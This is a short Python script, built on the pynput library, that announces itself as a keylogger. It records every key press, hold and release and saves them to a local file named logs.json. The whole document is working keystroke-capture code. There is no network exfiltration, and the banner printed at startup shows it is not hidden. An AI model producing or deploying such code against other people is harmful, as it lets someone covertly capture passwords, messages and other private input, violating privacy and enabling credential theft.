from pynput.keyboard import Listener
import json

key_list = []
x = False
key_strokes = ""

def update_json_file(key_list):
    with open('logs.json', 'w') as key_log:
        json.dump(key_list, key_log)

def on_press(key):
    global x, key_list
    if x == False:
        key_list.append({'Pressed': f'{key}'})
        x = True
    if x == True:
        key_list.append({'Held': f'{key}'})
    update_json_file(key_list)

def on_release(key):
    global x, key_list, key_strokes
    key_list.append({'Released': f'{key}'})
    if x == True:
        x = False
    update_json_file(key_list)

print("[+] Running Keylogger Successfully!\n [!] Saving the key logs in 'logs.json'")

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
